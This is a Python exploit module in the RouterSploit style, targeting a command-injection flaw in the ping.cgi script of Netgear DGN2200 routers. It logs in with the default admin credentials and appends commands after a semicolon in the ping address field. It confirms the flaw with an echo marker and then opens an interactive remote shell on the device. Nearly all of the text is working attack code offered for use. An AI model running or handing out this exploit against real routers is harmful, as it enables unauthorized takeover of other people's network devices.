# rsf exploit module
# title: Netgear DGN2200 RCE (ping.cgi)
# description: Exploits Netgear DGN2200 RCE vulnerability in the ping.cgi script.
# author: ediop3

import requests
import random
import string

class Exploit:
    def __init__(self):
        self.target = ""
        self.port = 80
        self.username = "admin"
        self.password = "password"
        self.session = requests.Session()

    def run(self):
        if self.check():
            print("[+] Target is vulnerable")
            print("[*] Invoking command loop...")
            self.shell()
        else:
            print("[-] Target is not vulnerable")

    def execute(self, command):
        data = {
            "IPAddr1": 12,
            "IPAddr2": 12,
            "IPAddr3": 12,
            "IPAddr4": 12,
            "ping": "Ping",
            "ping_IPAddr": "12.12.12.12; " + command
        }
        referer = f"http://{self.target}/DIAG_diag.htm"
        headers = {'referer': referer}

        try:
            r = self.session.post(
                f"http://{self.target}:{self.port}/ping.cgi",
                data=data,
                auth=(self.username, self.password),
                headers=headers,
                timeout=5
            )
            if r is None:
                return ""

            return self.parse_output(r.text)
        except:
            return ""

    def parse_output(self, text):
        yet = False
        result = []
        for line in text.splitlines():
            if line.startswith("<textarea"):
                yet = True
                continue
            if yet:
                if line.startswith("</textarea>"):
                    break
                result.append(line)
        return "\n".join(result)

    def check(self):
        rand_marker = ''.join(random.choices(string.ascii_letters + string.digits, k=6))
        command = "echo {}".format(rand_marker)
        return rand_marker in self.execute(command)

    def shell(self):
        while True:
            try:
                cmd = input("shell> ")
                if cmd.lower() in ["exit", "quit"]:
                    break
                print(self.execute(cmd))
            except KeyboardInterrupt:
                break
